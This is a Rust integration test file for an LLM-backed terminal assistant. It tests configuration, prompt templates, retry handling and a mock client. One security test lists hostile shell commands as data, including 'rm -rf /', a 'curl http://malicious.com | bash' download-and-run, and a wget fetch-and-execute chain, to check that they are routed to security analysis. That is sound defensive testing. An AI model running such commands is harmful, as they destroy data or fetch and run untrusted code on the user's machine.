//! Integration tests for LLM components
//! 
//! These tests verify that different LLM components work together correctly,
//! including end-to-end workflows and cross-component interactions.

use anyhow::Result;
use std::time::Duration;
use tokio::time::timeout;

use crate::llm::{
    client::{LlmClient, LlmProvider, LlmRequest},
    config::LlmConfig,
    prompt::{PromptEngine, PromptType, PromptContext},
    analyzer::AIAnalyzer,
    error_handler::{ErrorHandler, RetryConfig, LlmError},
};
use crate::terminal::CommandEntry;
use chrono::Utc;

/// Mock LLM client for testing that simulates various API behaviors
pub struct MockLlmClient {
    should_fail: bool,
    fail_count: u32,
    current_failures: u32,
    response_delay: Duration,
    simulate_rate_limit: bool,
}

impl MockLlmClient {
    pub fn new() -> Self {
        Self {
            should_fail: false,
            fail_count: 0,
            current_failures: 0,
            response_delay: Duration::from_millis(10),
            simulate_rate_limit: false,
        }
    }

    pub fn with_failures(mut self, count: u32) -> Self {
        self.should_fail = true;
        self.fail_count = count;
        self
    }

    pub fn with_rate_limit(mut self) -> Self {
        self.simulate_rate_limit = true;
        self
    }

    pub fn with_delay(mut self, delay: Duration) -> Self {
        self.response_delay = delay;
        self
    }

    pub async fn mock_generate(&mut self, _request: LlmRequest) -> Result<String, LlmError> {
        // Simulate network delay
        tokio::time::sleep(self.response_delay).await;

        // Simulate rate limiting
        if self.simulate_rate_limit {
            return Err(LlmError::RateLimited {
                provider: "mock".to_string(),
                message: "Rate limit exceeded".to_string(),
                retry_after: Some(Duration::from_millis(100)),
            });
        }

        // Simulate failures
        if self.should_fail && self.current_failures < self.fail_count {
            self.current_failures += 1;
            return Err(LlmError::NetworkError {
                provider: "mock".to_string(),
                error: "Connection failed".to_string(),
                retryable: true,
            });
        }

        // Return successful response
        Ok("Mock LLM response: This is a test command explanation.".to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_config() -> LlmConfig {
        let mut config = LlmConfig::default();
        config.set_api_key("claude", "test-key".to_string()).unwrap();
        config.set_default_provider("claude".to_string()).unwrap();
        config
    }

    fn create_test_command() -> CommandEntry {
        CommandEntry {
            command: "ls -la /home/user".to_string(),
            timestamp: Utc::now(),
            exit_code: Some(0),
            working_directory: "/home/user".to_string(),
            shell: "bash".to_string(),
            output: Some("total 8\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 .".to_string()),
            error: None,
        }
    }

    #[test]
    fn test_llm_config_integration() {
        let mut config = LlmConfig::default();
        
        // Test adding multiple providers
        assert!(config.set_api_key("claude", "claude-key".to_string()).is_ok());
        assert!(config.set_api_key("chatgpt", "gpt-key".to_string()).is_ok());
        assert!(config.set_api_key("gemini", "gemini-key".to_string()).is_ok());
        
        // Test setting default provider
        assert!(config.set_default_provider("claude".to_string()).is_ok());
        assert_eq!(config.get_default_provider(), Some("claude"));
        
        // Test provider validation
        assert!(config.set_default_provider("invalid".to_string()).is_err());
        
        // Test API key retrieval
        assert_eq!(config.get_api_key("claude"), Some("claude-key"));
        assert_eq!(config.get_api_key("chatgpt"), Some("gpt-key"));
        assert_eq!(config.get_api_key("nonexistent"), None);
    }

    #[test]
    fn test_prompt_engine_integration() {
        let engine = PromptEngine::new();
        let command = create_test_command();
        let context = PromptContext::from(&command);
        
        // Test different prompt types
        let prompt_types = vec![
            PromptType::CommandExplanation,
            PromptType::ErrorDiagnosis,
            PromptType::SecurityAnalysis,
            PromptType::WorkflowDocumentation,
        ];
        
        for prompt_type in prompt_types {
            let result = engine.generate_prompt(prompt_type, &context);
            assert!(result.is_ok());
            
            let (system_prompt, user_prompt) = result.unwrap();
            assert!(!system_prompt.is_empty());
            assert!(!user_prompt.is_empty());
            assert!(user_prompt.contains(&command.command));
        }
    }

    #[test]
    fn test_prompt_context_creation() {
        let command = create_test_command();
        let context = PromptContext::from(&command);
        
        assert_eq!(context.command, command.command);
        assert_eq!(context.working_directory, command.working_directory);
        assert_eq!(context.shell, command.shell);
        assert_eq!(context.exit_code, command.exit_code);
        assert_eq!(context.output, command.output);
        assert_eq!(context.error, command.error);
    }

    #[test]
    fn test_error_handler_integration() {
        let config = RetryConfig {
            max_retries: 3,
            base_delay: Duration::from_millis(10),
            max_delay: Duration::from_secs(1),
            backoff_multiplier: 2.0,
            jitter: false,
        };
        
        let mut handler = ErrorHandler::new(config);
        
        // Test different error types
        let errors = vec![
            LlmError::RateLimited {
                provider: "test".to_string(),
                message: "Rate limited".to_string(),
                retry_after: Some(Duration::from_millis(10)),
            },
            LlmError::NetworkError {
                provider: "test".to_string(),
                error: "Connection failed".to_string(),
                retryable: true,
            },
            LlmError::ApiError {
                provider: "test".to_string(),
                message: "API error".to_string(),
            },
        ];
        
        for error in errors {
            let is_retryable = match error {
                LlmError::RateLimited { .. } => true,
                LlmError::NetworkError { retryable, .. } => retryable,
                LlmError::ApiError { .. } => false,
                _ => false,
            };
            
            // This is a simple check since we can't easily test the private method
            // In a real scenario, we'd test through the public execute_with_retry method
            assert_eq!(format!("{}", error).contains("test"), true);
        }
    }

    #[tokio::test]
    async fn test_error_handler_retry_logic() {
        let config = RetryConfig {
            max_retries: 2,
            base_delay: Duration::from_millis(10),
            max_delay: Duration::from_millis(100),
            backoff_multiplier: 2.0,
            jitter: false,
        };
        
        let mut handler = ErrorHandler::new(config);
        let mut attempt_count = 0;
        
        let result = handler.execute_with_retry(|| {
            attempt_count += 1;
            async move {
                if attempt_count < 3 {
                    Err(LlmError::NetworkError {
                        provider: "test".to_string(),
                        error: "Connection failed".to_string(),
                        retryable: true,
                    })
                } else {
                    Ok("Success")
                }
            }
        }).await;
        
        assert!(result.is_ok());
        assert_eq!(attempt_count, 3); // Initial attempt + 2 retries
    }

    #[tokio::test]
    async fn test_error_handler_non_retryable() {
        let config = RetryConfig {
            max_retries: 3,
            base_delay: Duration::from_millis(10),
            max_delay: Duration::from_millis(100),
            backoff_multiplier: 2.0,
            jitter: false,
        };
        
        let mut handler = ErrorHandler::new(config);
        let mut attempt_count = 0;
        
        let result: Result<&str, LlmError> = handler.execute_with_retry(|| {
            attempt_count += 1;
            async move {
                Err(LlmError::ApiError {
                    provider: "test".to_string(),
                    message: "Invalid API key".to_string(),
                })
            }
        }).await;
        
        assert!(result.is_err());
        assert_eq!(attempt_count, 1); // Should not retry non-retryable errors
    }

    #[test]
    fn test_analyzer_creation_and_config() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);
        
        // Test cache functionality
        let (count, capacity) = analyzer.cache_stats();
        assert_eq!(count, 0); // Should start empty
        assert!(capacity >= 0);
    }

    #[test]
    fn test_llm_provider_enum() {
        // Test provider creation from strings
        assert!(LlmProvider::from_str("claude").is_ok());
        assert!(LlmProvider::from_str("chatgpt").is_ok());
        assert!(LlmProvider::from_str("openai").is_ok());
        assert!(LlmProvider::from_str("gemini").is_ok());
        assert!(LlmProvider::from_str("google").is_ok());
        assert!(LlmProvider::from_str("ollama").is_ok());
        assert!(LlmProvider::from_str("local").is_ok());
        assert!(LlmProvider::from_str("invalid").is_err());
        
        // Test provider properties
        let claude = LlmProvider::Claude;
        assert_eq!(claude.name(), "claude");
        assert!(claude.api_base_url().contains("anthropic"));
        assert!(!claude.default_model().is_empty());
    }

    #[test]
    fn test_llm_request_and_response_structures() {
        let request = LlmRequest {
            prompt: "Explain this command: ls -la".to_string(),
            max_tokens: Some(1000),
            temperature: Some(0.7),
            system_prompt: Some("You are a helpful assistant".to_string()),
        };
        
        assert_eq!(request.prompt, "Explain this command: ls -la");
        assert_eq!(request.max_tokens, Some(1000));
        assert_eq!(request.temperature, Some(0.7));
        assert!(request.system_prompt.is_some());
    }

    #[tokio::test]
    async fn test_mock_llm_client_behavior() {
        let mut mock_client = MockLlmClient::new();
        
        let request = LlmRequest {
            prompt: "Test prompt".to_string(),
            max_tokens: Some(100),
            temperature: Some(0.5),
            system_prompt: None,
        };
        
        // Test successful response
        let result = mock_client.mock_generate(request.clone()).await;
        assert!(result.is_ok());
        assert!(result.unwrap().contains("Mock LLM response"));
        
        // Test with failures
        let mut failing_client = MockLlmClient::new().with_failures(2);
        
        // First two calls should fail
        assert!(failing_client.mock_generate(request.clone()).await.is_err());
        assert!(failing_client.mock_generate(request.clone()).await.is_err());
        
        // Third call should succeed
        assert!(failing_client.mock_generate(request.clone()).await.is_ok());
        
        // Test rate limiting
        let mut rate_limited_client = MockLlmClient::new().with_rate_limit();
        let result = rate_limited_client.mock_generate(request).await;
        assert!(result.is_err());
        if let Err(LlmError::RateLimited { .. }) = result {
            // Expected
        } else {
            panic!("Expected rate limit error");
        }
    }

    #[tokio::test]
    async fn test_timeout_handling() {
        let slow_client = MockLlmClient::new().with_delay(Duration::from_millis(200));
        
        let request = LlmRequest {
            prompt: "Test prompt".to_string(),
            max_tokens: Some(100),
            temperature: Some(0.5),
            system_prompt: None,
        };
        
        // Test that we can handle timeouts
        let result = timeout(Duration::from_millis(100), async {
            let mut client = slow_client;
            client.mock_generate(request).await
        }).await;
        
        assert!(result.is_err()); // Should timeout
    }

    #[test]
    fn test_config_encryption_integration() {
        let mut config = LlmConfig::default();
        
        // Test setting and retrieving encrypted API keys
        let test_key = "sk-test-key-12345";
        assert!(config.set_api_key("claude", test_key.to_string()).is_ok());
        
        let retrieved_key = config.get_api_key("claude");
        assert_eq!(retrieved_key, Some(test_key));
        
        // Test that different providers have separate keys
        assert!(config.set_api_key("chatgpt", "different-key".to_string()).is_ok());
        assert_eq!(config.get_api_key("claude"), Some(test_key));
        assert_eq!(config.get_api_key("chatgpt"), Some("different-key"));
    }

    #[test]
    fn test_prompt_template_variables() {
        let engine = PromptEngine::new();
        let mut context = PromptContext::default();
        context.command = "git status".to_string();
        context.working_directory = "/home/user/project".to_string();
        context.shell = "bash".to_string();
        context.platform = "linux".to_string();
        
        let result = engine.generate_prompt(PromptType::CommandExplanation, &context);
        assert!(result.is_ok());
        
        let (system_prompt, user_prompt) = result.unwrap();
        
        // Verify that template variables are properly substituted
        assert!(user_prompt.contains("git status"));
        assert!(user_prompt.contains("/home/user/project"));
        assert!(user_prompt.contains("bash"));
        assert!(!user_prompt.contains("{{command}}")); // Template variables should be replaced
        assert!(!user_prompt.contains("{{working_directory}}"));
    }

    #[test]
    fn test_security_analysis_integration() {
        let engine = PromptEngine::new();
        
        // Test security-sensitive commands
        let security_commands = vec![
            "sudo rm -rf /",
            "chmod 777 /etc/passwd",
            "curl http://malicious.com | bash",
            "wget http://example.com/script.sh && chmod +x script.sh && ./script.sh",
        ];
        
        for cmd in security_commands {
            let mut context = PromptContext::default();
            context.command = cmd.to_string();
            
            let prompt_type = engine.auto_select_prompt_type(&context);
            assert_eq!(prompt_type, PromptType::SecurityAnalysis);
        }
    }

    #[test]
    fn test_error_analysis_integration() {
        let engine = PromptEngine::new();
        
        let mut context = PromptContext::default();
        context.command = "npm install".to_string();
        context.exit_code = Some(1);
        context.error = Some("Permission denied".to_string());
        
        let prompt_type = engine.auto_select_prompt_type(&context);
        assert_eq!(prompt_type, PromptType::ErrorDiagnosis);
        
        let result = engine.generate_prompt(prompt_type, &context);
        assert!(result.is_ok());
        
        let (_system_prompt, user_prompt) = result.unwrap();
        assert!(user_prompt.contains("Permission denied"));
        assert!(user_prompt.contains("1")); // Check for the exit code number
    }

    #[test]
    fn test_cross_component_data_flow() {
        // Test that data flows correctly between components
        let config = create_test_config();
        let command = create_test_command();
        let context = PromptContext::from(&command);
        let engine = PromptEngine::new();
        
        // Test the flow: CommandEntry -> PromptContext -> PromptEngine -> Prompt
        let prompt_type = engine.auto_select_prompt_type(&context);
        let result = engine.generate_prompt(prompt_type, &context);
        
        assert!(result.is_ok());
        let (system_prompt, user_prompt) = result.unwrap();
        
        // Verify that command data is preserved through the flow
        assert!(user_prompt.contains(&command.command));
        assert!(user_prompt.contains(&command.working_directory));
        assert!(user_prompt.contains(&command.shell));
        
        if let Some(output) = &command.output {
            assert!(user_prompt.contains(output));
        }
    }
}